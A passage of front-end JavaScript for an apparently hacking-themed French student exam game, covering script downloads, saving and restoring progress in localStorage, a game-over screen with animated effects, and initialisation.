    document.querySelectorAll('.download-item').forEach(btn => {
        btn.addEventListener('click', () => {
            const scriptName = btn.dataset.script;
            const content = DOWNLOADABLE_SCRIPTS[scriptName];
            if (!content) return;

            const blob = new Blob([content], { type: 'text/plain; charset=utf-8' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = scriptName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            showToast('TÉLÉCHARGEMENT', scriptName + ' téléchargé avec succès.', true);
        });
    });
}

// ── SAVE / LOAD STATE ─────────────────────────────────────
function saveState() {
    try {
        localStorage.setItem('blackout_save', JSON.stringify({
            agentName: state.agentName,
            studentId: state.studentId,
            currentLevel: state.currentLevel,
            unlockedLevels: state.unlockedLevels,
            generatedCodes: state.generatedCodes,
            completedLevels: state.completedLevels,
            examAnswers: state.examAnswers
        }));
    } catch (e) { /* silent */ }
}

function loadState() {
    try {
        const saved = localStorage.getItem('blackout_save');
        if (saved) {
            const data = JSON.parse(saved);
            if (data.agentName) state.agentName = data.agentName;
            if (data.studentId) state.studentId = data.studentId;
            if (data.currentLevel) state.currentLevel = data.currentLevel;
            if (data.unlockedLevels) state.unlockedLevels = data.unlockedLevels;
            if (data.generatedCodes) state.generatedCodes = data.generatedCodes;
            if (data.completedLevels) state.completedLevels = data.completedLevels;
            if (data.examAnswers) state.examAnswers = data.examAnswers;
            
            // Restore UI from saved state
            restoreSavedUI();
        }
    } catch (e) { /* silent */ }
}

function restoreSavedUI() {
    // Restore quiz level banners and codes
    ['level0', 'level3'].forEach(level => {
        if (state.completedLevels.includes(level)) {
            const banner = document.getElementById('banner-' + level);
            if (banner) banner.classList.remove('hidden');
            const codeEl = document.getElementById('code-value-' + level);
            if (codeEl && state.generatedCodes[level]) {
                codeEl.textContent = state.generatedCodes[level];
            }
            // Restore QCM answers and disable inputs
            const panel = document.getElementById('quiz-' + level);
            if (panel && state.examAnswers[level]) {
                const answers = state.examAnswers[level];
                Object.keys(answers).forEach(key => {
                    if (key.startsWith('fill')) {
                        const input = panel.querySelector('input[name="' + key + '"]');
                        if (input) { input.value = answers[key]; input.disabled = true; }
                    } else {
                        const radio = panel.querySelector('input[name="' + key + '"][value="' + answers[key] + '"]');
                        if (radio) { radio.checked = true; }
                    }
                });
                panel.querySelectorAll('input').forEach(inp => inp.disabled = true);
                const hint = document.getElementById('quiz-hint-' + level);
                if (hint) {
                    hint.textContent = '\u2713 Réponses enregistrées.';
                    hint.style.color = 'var(--green)';
                }
            }
        }
    });

    // Restore terminal level banners
    ['level1', 'level2', 'level4', 'level5'].forEach(level => {
        if (state.completedLevels.includes(level)) {
            const banner = document.getElementById('banner-' + level);
            if (banner) banner.classList.remove('hidden');
            const codeEl = document.getElementById('code-value-' + level);
            if (codeEl && state.generatedCodes[level]) {
                codeEl.textContent = state.generatedCodes[level];
            }
            // NOTE: text inputs are NOT disabled — students can keep editing after completion
        }
    });

    // Restore briefing code
    if (state.generatedCodes['briefing']) {
        const codeEl = document.getElementById('code-value-briefing');
        if (codeEl) codeEl.textContent = state.generatedCodes['briefing'];
        const reveal = document.getElementById('code-reveal-briefing');
        if (reveal) reveal.classList.remove('hidden');
    }

    // Restore agent name display
    document.getElementById('agent-badge').textContent = 'AGENT: ' + state.agentName;
    document.querySelectorAll('.agent-name-display').forEach(el => {
        el.textContent = state.agentName;
    });

    // Restore terminal objectives from saved state
    if (state.examAnswers && state.examAnswers.terminalAnswers && typeof LEVEL_OBJECTIVES !== 'undefined') {
        for (const [level, objectives] of Object.entries(state.examAnswers.terminalAnswers)) {
            if (LEVEL_OBJECTIVES[level]) {
                for (const [id, data] of Object.entries(objectives)) {
                    if (LEVEL_OBJECTIVES[level].objectives[id]) {
                        LEVEL_OBJECTIVES[level].objectives[id].validated = true;
                        LEVEL_OBJECTIVES[level].objectives[id].command = data.command;
                    }
                }
            }
        }
    }
}

// ── GAMEOVER ─────────────────────────────────────────────
window.showGameOver = function() {
    const overlay = document.getElementById('screen-gameover');
    const skull = document.getElementById('skull-ascii');
    const rain = document.getElementById('gameover-rain');
    const restartBtn = document.getElementById('btn-restart');

    if (skull) skull.textContent = CONFIG.skullAsciiArt;
    
    // Create rain
    if (rain) {
        rain.innerHTML = '';
        for (let i = 0; i < 30; i++) {
            const col = document.createElement('div');
            col.className = 'rain-column';
            col.style.left = (Math.random() * 100) + '%';
            col.style.animationDuration = (4 + Math.random() * 8) + 's';
            col.style.animationDelay = (Math.random() * 5) + 's';
            let chars = '';
            for (let j = 0; j < 40; j++) {
                chars += String.fromCharCode(0x30A0 + Math.random() * 96) + '\n';
            }
            col.textContent = chars;
            rain.appendChild(col);
        }
    }

    overlay.classList.remove('hidden');

    if (restartBtn) {
        restartBtn.addEventListener('click', () => {
            // If exam was already submitted, block restart
            const sub = localStorage.getItem('blackout_submitted');
            if (sub) {
                try {
                    const data = JSON.parse(sub);
                    showSubmittedScreen(data.nom, data.prenom, data.studentId);
                    return;
                } catch(e) {}
            }
            localStorage.removeItem('blackout_save');
            localStorage.removeItem('blackout_timer');
            localStorage.removeItem('blackout_restart');
            location.reload();
        });
    }
};

// ── INITIALIZATION ────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
    setupLogin();
    startBoot();
});
